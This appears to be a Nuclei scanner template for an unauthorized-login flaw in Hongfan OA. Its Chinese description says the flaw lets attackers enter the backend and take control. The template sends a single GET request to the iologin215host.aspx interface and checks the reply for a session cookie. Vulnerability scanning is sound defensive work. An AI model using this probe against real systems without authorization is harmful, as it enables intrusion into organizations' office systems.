id: hongfan-oa-unauthorized-login

info:
  name: "红帆OA iologin215host.aspx 未授权访问漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    红帆OA系统存在后台接口未授权访问漏洞，攻击者可通过该漏洞直接登录后台，获取系统控制权。
    日期：2023-12-04
  tags: 红帆

http:
- raw:
  - |
    GET /iOffice/prg/interface/iologin215host.aspx HTTP/1.1
    Host: {{Hostname}}
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'set-cookie'
